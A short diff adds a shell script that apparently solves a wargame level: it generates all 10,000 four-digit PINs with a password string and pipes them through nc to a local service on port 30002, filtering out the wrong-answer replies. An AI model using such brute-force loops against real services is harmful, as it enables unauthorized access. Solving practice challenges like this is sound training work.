@@ -1,0 +1,9 @@
+# 1
+dir_name=$(mktemp -d)
+cd $dir_name
+# 2
+for pin in {0000..9999}; do
+	echo -e "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"
+done > combinations.txt
+# 3
+cat combinations.txt | nc localhost 30002 | grep -vE "Wrong|Enter the"
